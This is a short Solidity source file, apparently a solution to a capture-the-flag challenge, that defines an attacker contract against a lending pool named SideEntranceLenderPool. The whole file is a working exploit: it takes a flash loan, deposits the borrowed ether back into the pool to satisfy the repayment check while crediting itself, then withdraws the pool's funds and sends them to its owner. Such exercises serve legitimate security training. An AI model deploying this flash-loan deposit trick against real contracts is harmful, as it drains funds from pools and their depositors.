// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import './SideEntranceLenderPool.sol';
import "solmate/src/auth/Owned.sol";

contract SideEntranceAttacker is IFlashLoanEtherReceiver, Owned {
    SideEntranceLenderPool pool;
    uint256 amount;

    constructor(SideEntranceLenderPool _pool, uint256 _amount) Owned(msg.sender) {
        pool = _pool;
        amount = _amount;
    }


    function attack() onlyOwner external {
        pool.flashLoan(amount);
        pool.withdraw();
    }

    function withdraw() onlyOwner external {
        msg.sender.call{value: address(this).balance}("");
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}